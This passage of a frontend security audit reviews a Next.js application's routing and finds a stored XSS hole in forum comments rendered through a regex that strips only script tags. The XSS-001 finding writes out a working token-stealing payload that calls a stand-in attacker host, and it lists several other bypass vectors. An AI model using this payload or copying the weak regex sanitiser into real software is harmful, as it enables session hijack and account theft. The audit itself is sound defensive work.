```

**Other routing observations:**
- No conflicting/duplicate dynamic route segments were found (e.g. no sibling `[id]` vs `[slug]` collision at the same path depth).
- Nested layout depth is reasonable; the one call-out is `(authenticated)/console/layout.tsx` computing nav visibility from six separate `AuthorizationService` calls on every render with no memoization — a performance nit, not correctness.
- Most route subtrees have **no `error.tsx`** — an uncaught render error in, e.g., `/console/payments` or `/studio/course/[courseId]/edit` bubbles up to whatever boundary exists above it (root `not-found.tsx` doesn't catch runtime errors, only 404s), likely surfacing Next.js's default error overlay/blank screen in production for any unhandled exception. Recommend adding `error.tsx` at minimum to `console/`, `studio/` (non-events subtrees), and `channels/[id]/manage/`.

---

## Part 4 — General Frontend Security Audit

```
ID: XSS-001
Severity: P0
Category: XSS / unsafe HTML rendering
Location: E:\arcade\ui\domains\community\components\CommentCard.tsx:130-136, E:\arcade\ui\app\(public)\forum\[slug]\page.tsx:147-153
Problem: User-authored forum post/comment bodies are rendered via `dangerouslySetInnerHTML`, "sanitized" only by a regex that strips `<script>...</script>` tags: `comment.body.replace(/<script[\s\S]*?<\/script>/gi, '')`. This is not sanitization — it does nothing to event-handler attributes or other injection vectors.
Evidence: `dangerouslySetInnerHTML={{ __html: comment.body.replace(/<script[\s\S]*?<\/script>/gi, '') }}` (identical pattern in both files, for `comment.body` and `post.body` respectively).
Why it matters: This is the textbook incomplete-blocklist XSS mistake. A regex that only removes `<script>` tags does not stop `<img src=x onerror=alert(document.cookie)>`, `<svg onload=...>`, `<a href="javascript:...">`, `<iframe src="javascript:...">`, `style="...expression(...)"`, or dozens of other event-handler-attribute vectors, all of which execute arbitrary JavaScript in the victim's session without ever containing the literal string `<script`.
Failure / Attack scenario: Any forum member (this is public-forum content, `(public)/forum/[slug]`, reachable by anyone who can post — need to confirm posting itself requires auth, but reading is public) posts a comment or thread body containing `<img src=x onerror="fetch('https://attacker.example/steal?t='+localStorage.getItem('arcade-auth-storage'))">`. Every visitor (including other logged-in users, and specifically any Platform Console admin who reads the forum) who views that post/comment executes the payload, exfiltrating their `arcade-auth-storage` localStorage blob (containing the live access token, per AUTH-002) to the attacker — full session hijack, potentially of an admin account, from a public unauthenticated-reach surface.
Affected users/features: Every visitor/user who views any forum post or comment, including admins; downstream, every system reachable via a hijacked access token.
Recommended direction: Replace the regex strip with a real HTML sanitizer (e.g. DOMPurify) run against an explicit allowlist of tags/attributes appropriate for rich-text forum content (no `on*` attributes, no `javascript:`/`data:` URLs, no `<script>`/`<iframe>`/`<object>`/`<embed>`), applied consistently at both render sites (and ideally centralized into one shared "SafeHtml" component rather than duplicated inline).
Implementation complexity: Small (drop-in library), moderate to get the allowlist right for existing content.
Regression risk: Low-moderate — may strip formatting from existing posts that use tags/attributes outside the new allowlist; recommend auditing a sample of existing stored bodies against the chosen sanitizer's default config before shipping.
Dependencies: Combine with AUTH-002 fix (move access token out of localStorage) for defense in depth — sanitization is the primary fix, token-storage hardening limits blast radius if a future gap slips through.
Status: CONFIRMED SECURITY ISSUE
```

```
ID: XSS-002
Severity: P3
Category: XSS / unsafe HTML rendering (lower-risk, review only)
Location: E:\arcade\ui\features\roadmap\renderer\components\RoadmapViewer.tsx:1509, E:\arcade\ui\domains\assessments\components\prompt-editor\PromptView.tsx:63,148
Problem: Two more `dangerouslySetInnerHTML` sites: RoadmapViewer renders `node.subtitle` (roadmap-node content, author-supplied via Studio) raw; PromptView renders KaTeX's own `renderToString()` output for math expressions.
Why it matters: PromptView's KaTeX usage is low-risk — KaTeX's renderer output is not attacker-controlled beyond the LaTeX source string, and `throwOnError: false` just falls back to rendering the raw string as text on parse failure, not raw HTML injection; KaTeX is designed to be used this way. RoadmapViewer's `node.subtitle` is content-author-supplied text with no visible sanitization step in the excerpt reviewed — worth the same scrutiny as XSS-001 if roadmap node subtitles accept arbitrary HTML input anywhere upstream (e.g. a rich text field in the roadmap editor).
Failure scenario: Not confirmed — depends on whether the roadmap editor UI/backend allows arbitrary HTML in `subtitle` or constrains it to plain text upstream. If constrained upstream, this is a non-issue; if not, it's the same stored-XSS pattern as XSS-001 but scoped to whoever can author roadmap content (Studio users) rather than any forum poster.
Recommended direction: Confirm whether `node.subtitle` can contain arbitrary HTML from the roadmap content editor; if yes, sanitize identically to the XSS-001 fix. Leave PromptView's KaTeX usage as-is.
Implementation complexity: N/A pending verification.
Regression risk: N/A.
Dependencies: Roadmap editor input constraints (not reviewed in this pass).
Status: UNVERIFIED / NEEDS TESTING
```

**Other general security checks performed:**
- **Secrets / `.env` files**: No `.env*` files of any kind exist anywhere under `E:\arcade\ui` (confirmed by recursive search excluding `node_modules`/`.next`/`.claude`). Nothing to flag on the frontend side. (Note: `.env`, `.env.example`, and `.env.r2.local` do exist under `E:\arcade\backend`, but that directory is out of scope for this frontend-focused check per the audit brief, which specifically scoped the `.env` check to `E:\arcade\ui`.)
- **`NEXT_PUBLIC_*` usage**: Only `NEXT_PUBLIC_API_URL` was found in use (16 files), consistently used as the backend base URL with a `localhost:8080` fallback — this is expected to be public (it's the API origin, not a secret) and is not itself a secret leak. No other `NEXT_PUBLIC_*` variables (no API keys, no third-party tokens) were found referenced anywhere in the codebase.
- **Open redirects**: Not exhaustively traced across every `router.push`/`redirect` call site given time budget; no obvious user-controlled-URL redirect pattern (e.g. `router.push(searchParams.get('redirect'))` unsanitized) was encountered incidentally while reviewing the auth/console/studio flows reviewed above. Recommend a follow-up grep for `searchParams.get` piped directly into `router.push`/`window.location` if a deeper pass is wanted.
- **iframe / postMessage**: Not exhaustively audited this pass; no iframe/postMessage usage was encountered incidentally in the auth, console, studio, or channel-management code reviewed.
- **Third-party script loading**: Not exhaustively audited this pass.
- **File upload/preview**: Not exhaustively audited this pass beyond noting `channel.videos.upload`/`channel.videos.delete` exist as real backend-enforced channel permissions; the frontend upload UI itself wasn't traced for e.g. unrestricted file-type acceptance or client-side-only validation.

---

## Summary of P0/P1 findings

| ID | Severity | One-line summary |
|---|---|---|
| IAM-003 | P0 | `/console/inbox` — backend `@PreAuthorize("isAuthenticated()")` only, no permission check; any learner can read/modify/delete platform-wide contact & abuse-report queue. Frontend has zero guard either. |
| XSS-001 | P0 | Forum post/comment HTML rendered via `dangerouslySetInnerHTML` with only a `<script>`-tag regex strip — trivially bypassed stored XSS on a public, unauthenticated-reach surface. |
| AUTH-002 | P2 (escalated by XSS-001) | Access token persisted to plaintext localStorage — turns any XSS (see XSS-001) into full session hijack. |
| IAM-001 | P1 | Six of nine frontend permission checks (`platform.users.manage`, `platform.roles.assign`, `platform.permissions.manage`, `platform.categories.manage`, `platform.audit.view`, `payments.view`) reference permission codes that do not exist in the backend's seeded model — entire Console sections are unreachable for every real role except literal `PLATFORM_OWNER`. |
